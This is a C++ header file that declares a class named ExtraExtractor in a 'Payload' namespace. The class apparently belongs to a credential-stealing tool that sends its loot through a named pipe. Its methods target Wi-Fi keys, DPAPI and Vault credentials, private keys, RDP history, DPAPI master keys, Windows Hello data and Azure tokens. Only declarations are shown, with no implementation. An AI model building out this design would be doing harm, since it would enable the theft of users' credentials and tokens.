#pragma once
#include "pipe_client.hpp"
#include <vector>
#include <string>

namespace Payload {
    class ExtraExtractor {
    public:
        explicit ExtraExtractor(PipeClient& pipe);
        void CollectAll();

    private:
        void CollectWiFi();
        void CollectDPAPICredentials();   // now uses CredEnumerate
        void CollectVault();              // now uses Vault API
        void CollectRAS();
        void CollectPrivateKeys();        // improved RSA parsing + certificate PFX
        void CollectLegacyApps();
        void CollectRDPHistory();
        void CollectRDPFiles();
        void CollectOutgoingRDP();

        void CollectUserMasterKeys();
        void CollectMachineMasterKeys();
        void CollectWindowsHello();
        void CollectAzureTokens();


        PipeClient& m_pipe;
    };
}
